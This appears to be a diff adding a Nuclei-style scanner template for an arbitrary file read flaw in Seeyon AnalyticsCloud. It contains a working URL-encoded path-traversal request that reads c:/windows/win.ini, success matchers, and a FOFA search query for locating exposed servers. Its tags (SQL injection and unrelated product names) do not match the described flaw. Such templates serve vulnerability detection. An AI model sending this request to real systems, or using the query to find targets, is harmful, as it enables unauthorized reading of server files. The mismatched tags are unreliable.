@@ -1,0 +1,30 @@
+id: NPoc-12
+
+info:
+  name: 致远互联AnalyticsCloud 分析云存在任意文件读取漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    致远互联AnalyticsCloud 分析云（以下简称“致远分析云”）是北京致远互联软件股份有限公司专门为企业数字化转型升级而打造的一站式数据分析平台。攻击者可通过Web应用程序读取服务器上的任意文件，而不受正常的访问控制限制。这种漏洞通常是由于程序对用户输入的数据没有进行充分的验证和过滤所导致的。
+  metadata:
+    verified: false
+    max-request: 1
+    fofa-query: title="AnalyticsCloud 分析云"
+  tags: SQL注入,数字通,智慧政务
+request:
+  - raw:
+      - |
+        GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
+          - '[16-bit]'
+        condition: or   
